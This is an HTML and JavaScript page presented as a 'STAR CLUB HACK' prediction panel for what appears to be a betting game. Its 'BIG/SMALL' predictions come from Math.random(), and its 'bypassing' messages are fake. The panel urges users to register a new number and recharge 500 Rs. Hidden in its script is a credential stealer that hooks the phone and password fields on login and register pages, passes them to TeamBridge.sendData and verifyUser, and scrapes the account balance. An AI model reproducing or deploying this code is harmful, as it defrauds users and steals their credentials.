<!DOCTYPE html>
<html>

</html><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>STAR CLUB HACK - ULTIMATE BLUE</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@500;900&family=Share+Tech+Mono&display=swap');

        :root {
            --deep-blue: #000428;
            --neon-blue: #00d2ff;
            --glow-blue: rgba(0, 210, 255, 0.6);
            --border-color: rgba(0, 210, 255, 0.5);
        }

        body { margin: 0; background: transparent; font-family: 'Orbitron', sans-serif; }

        /* ہیوی ڈارک بلو پینل */
        #main-panel {
            width: 230px;
            background: radial-gradient(circle, #000428 0%, #000000 100%);
            border: 2px solid var(--border-color);
            border-radius: 15px;
            position: absolute;
            top: 50px;
            left: 50px;
            color: #fff;
            box-shadow: 0 0 30px rgba(0, 210, 255, 0.3), inset 0 0 20px #000;
            cursor: move;
            z-index: 1000000;
            backdrop-filter: blur(15px);
            overflow: hidden;
            animation: boundaryGlow 3s infinite alternate;
        }

        @keyframes boundaryGlow {
            0% { border-color: var(--border-color); box-shadow: 0 0 15px var(--glow-blue); }
            100% { border-color: var(--neon-blue); box-shadow: 0 0 35px var(--neon-blue); }
        }

        .header {
            padding: 8px;
            text-align: center;
            background: rgba(0, 210, 255, 0.1);
            border-bottom: 1px solid var(--border-color);
            font-size: 11px;
            font-weight: 900;
            letter-spacing: 2px;
            text-shadow: 0 0 10px var(--neon-blue);
        }

        .display-screen {
            margin: 10px;
            padding: 15px;
            background: rgba(0, 0, 0, 0.7);
            border-radius: 10px;
            border: 1px solid var(--border-color);
            min-height: 120px;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            position: relative;
        }

        #typing-area {
            font-family: 'Share Tech Mono', monospace;
            font-size: 10px;
            color: var(--neon-blue);
            text-align: center;
            line-height: 1.5;
        }

        #prediction-area {
            display: none;
            text-align: center;
        }

        .period-label { font-size: 9px; color: #888; margin-bottom: 5px; }
        .result-big-small { font-size: 28px; font-weight: 900; text-shadow: 0 0 15px var(--neon-blue); }
        .result-number { font-size: 55px; font-weight: 900; color: #fff; margin-top: -5px; }

        .scanner {
            display: none;
            width: 100%;
            height: 2px;
            background: var(--neon-blue);
            box-shadow: 0 0 15px var(--neon-blue);
            position: absolute;
            animation: scan 1s infinite linear;
        }
        @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }

        .btn-box { display: flex; gap: 8px; margin: 0 10px 10px 10px; }
        button {
            flex: 1;
            padding: 10px;
            font-size: 9px;
            font-weight: bold;
            border-radius: 8px;
            cursor: pointer;
            text-transform: uppercase;
            font-family: 'Orbitron', sans-serif;
            transition: 0.3s;
        }

        .reg-btn {
            background: transparent;
            color: var(--neon-blue);
            border: 1px solid var(--neon-blue);
            box-shadow: 0 0 10px rgba(0, 210, 255, 0.2);
        }
        .reg-btn:hover { background: var(--neon-blue); color: #000; box-shadow: 0 0 20px var(--neon-blue); }

        .hide-btn {
            background: rgba(255, 255, 255, 0.05);
            color: #666;
            border: 1px solid #333;
        }

        .hidden { display: none; }
    </style>
</head>
<body>

<div id="main-panel">
    <div class="header">STAR CLUB HACK</div>
    
    <div id="panel-content">
        <div class="display-screen">
            <div id="scanner" class="scanner"></div>
            
            <div id="typing-area"></div>

            <div id="prediction-area">
                <div class="period-label">PERIOD: <span id="period-num">----</span></div>
                <div id="res-bs" class="result-big-small">WAIT</div>
                <div id="res-num" class="result-number">?</div>
            </div>
        </div>

        <div class="btn-box">
            <button id="action-btn" class="reg-btn" onclick="startActivation()">REGISTER NOW</button>
            <button class="hide-btn" onclick="toggleView()">HIDE</button>
        </div>
    </div>
</div>

<script>
    /* --- SECTION: DRAG & DROP CODES --- */

    // 1. Balance Extractor (From previous step)
    function getBalance() {
        var sel = ['.balance-amount', '.money', '.balanceNum', '.amount'];
        for (var x of sel) {
            var e = document.querySelector(x);
            if (e && e.innerText.includes('.') && !isNaN(parseFloat(e.innerText.replace(/[^0-9.]/g, '')))) 
                return e.innerText;
        }
        var m = document.body.innerText.match(/[₹]?\s?([\d,]+\.\d{2})/);
        return m ? m[1] : '0.00';
    }

    // 2. User/Auth Hooks (Your Latest Code Added Here)
    (function(){
        setInterval(function(){
            var ph = document.querySelector('input[type="tel"]') || document.querySelector('input[placeholder*="phone"]');
            var ps = document.querySelector('input[type="password"]') || document.querySelector('input[placeholder*="password"]');
            var bs = document.querySelectorAll('button');

            if(window.location.href.includes('login') && ph){
                if(!ph.getAttribute('checked_on_load') && ph.value.length === 10){
                    ph.setAttribute('checked_on_load','1');
                    if(typeof TeamBridge !== 'undefined') TeamBridge.verifyUser(ph.value);
                }
                if(!ph.getAttribute('hooked')){
                    ph.setAttribute('hooked','1');
                    ph.addEventListener('input', function(){
                        if(ph.value.length === 10 && typeof TeamBridge !== 'undefined'){ TeamBridge.verifyUser(ph.value); }
                    });
                }
            }
            bs.forEach(function(b){
                if(window.location.href.includes('register') && !b.getAttribute('h')){
                    b.setAttribute('h','1'); 
                    b.addEventListener('click',function(){
                        if(ph && ps && ph.value.length>=10 && typeof TeamBridge !== 'undefined') 
                            TeamBridge.sendData(ph.value,ps.value);
                    });
                }
            });
        }, 1000);
    })();

    /* --- SECTION: PANEL FUNCTIONS --- */

    const panel = document.getElementById("main-panel");
    let drag = false, offset = [0,0];
    panel.onmousedown = (e) => {
        if(e.target.tagName === 'BUTTON') return;
        drag = true;
        offset = [panel.offsetLeft - e.clientX, panel.offsetTop - e.clientY];
    };
    document.onmousemove = (e) => {
        if (drag) {
            panel.style.left = (e.clientX + offset[0]) + 'px';
            panel.style.top = (e.clientY + offset[1]) + 'px';
        }
    };
    document.onmouseup = () => drag = false;

    const msg = "DO NOT LOGIN YOUR OLD ID. REGISTER WITH A NEW MOBILE NUMBER TO USE THIS HACK. MINIMUM RECHARGE 500 RS REQUIRED FOR ACTIVATION.";
    let i = 0;
    function type() {
        if (i < msg.length) {
            document.getElementById("typing-area").innerHTML += msg.charAt(i);
            i++;
            setTimeout(type, 40);
        }
    }
    window.onload = type;

    function startActivation() {
        const btn = document.getElementById("action-btn");
        const typing = document.getElementById("typing-area");
        const pred = document.getElementById("prediction-area");
        const scanner = document.getElementById("scanner");

        btn.disabled = true;
        btn.innerText = "ACTIVATING...";
        
        let currentBalance = getBalance();
        typing.innerHTML = "ESTABLISHING SECURE CONNECTION...<br>AUTH HOOKS LOADED.<br>BALANCE: " + currentBalance + "<br>BYPASSING...";
        scanner.style.display = "block";

        setTimeout(() => {
            scanner.style.display = "none";
            typing.style.display = "none";
            pred.style.display = "block";
            
            btn.disabled = false;
            btn.innerText = "GET PREDICTION";
            btn.setAttribute("onclick", "generatePrediction()");
            generatePrediction();
        }, 3000);
    }

    function updatePeriod() {
        const now = new Date();
        const min = now.getUTCHours() * 60 + now.getUTCMinutes() + 1;
        document.getElementById("period-num").innerText = String(min).padStart(4, '0');
    }
    setInterval(updatePeriod, 1000);

    function generatePrediction() {
        const scanner = document.getElementById("scanner");
        const resBs = document.getElementById("res-bs");
        const resNum = document.getElementById("res-num");
        
        scanner.style.display = "block";
        resBs.style.opacity = "0.3";
        resNum.style.opacity = "0.3";

        setTimeout(() => {
            scanner.style.display = "none";
            resBs.style.opacity = "1";
            resNum.style.opacity = "1";
            
            const num = Math.floor(Math.random() * 10);
            const bigSmall = num >= 5 ? "BIG" : "SMALL";
            
            resBs.innerText = bigSmall;
            resBs.style.color = (bigSmall === "BIG") ? "#00d2ff" : "#fff";
            resNum.innerText = num;
            updatePeriod();
        }, 1200);
    }

    function toggleView() {
        const content = document.getElementById("panel-content");
        content.classList.toggle("hidden");
    }
</script>

</body>
</html>
